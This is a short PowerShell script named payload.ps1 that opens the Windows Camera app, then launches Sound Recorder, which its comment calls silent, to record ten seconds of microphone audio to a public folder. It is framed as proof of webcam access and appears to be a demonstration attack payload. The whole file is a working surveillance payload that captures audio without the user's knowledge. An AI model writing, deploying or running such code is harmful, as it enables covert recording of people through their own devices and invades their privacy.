# payload.ps1

# Open Camera App (user will see it pop up, proving webcam access)
Start-Process "microsoft.windows.camera:"

# Wait 3 seconds to simulate capture/view
Start-Sleep -Seconds 3

# Record 10-second audio using built-in Voice Recorder
# Launch Sound Recorder silently
Start-Process "soundrecorder.exe" "/FILE C:\Users\Public\mic.m4a /DURATION 10"

# Wait for recording to finish
Start-Sleep -Seconds 12

# Done
